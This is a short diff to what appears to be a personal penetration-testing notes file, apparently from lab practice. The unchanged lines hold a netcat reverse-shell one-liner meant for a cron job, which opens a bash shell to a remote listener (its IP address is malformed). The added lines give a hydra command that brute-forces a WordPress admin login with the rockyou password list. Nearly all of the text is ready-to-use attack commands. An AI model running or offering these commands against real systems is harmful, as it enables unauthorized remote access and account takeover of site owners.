@@ -187,3 +187,7 @@ search platform:windows bid:5411
 NETCAT for cronjobs:
 #!/bin/bash
 nc -c /bin/bash\ -i 192.168.1129.1119 5555 0>&1
+
+bruteforcing wplogin hydra
+hydra -l admin -P /home/kali/Desktop/10.11.1/rockyou.txt 10.11.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
+In&testcookie=1:S=Location'
